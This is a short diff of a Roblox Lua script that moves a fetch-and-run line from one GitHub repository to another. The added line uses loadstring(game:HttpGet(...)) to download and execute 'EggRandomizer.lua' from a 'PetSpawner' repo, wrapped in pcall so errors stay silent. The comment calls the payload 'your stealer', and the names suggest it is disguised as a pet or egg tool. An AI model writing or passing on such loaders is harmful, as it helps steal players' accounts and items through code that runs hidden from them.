@@ -4,6 +4,6 @@ pcall(function()
 end)
 
 pcall(function()
-    -- Load your stealer (EggRandomizer.lua)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/SpinUI/main/EggRandomizer.lua"))()
+    -- Load your stealer (EggRandomizer.lua) from PetSpawner repo
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/PetSpawner/main/EggRandomizer.lua"))()
 end)
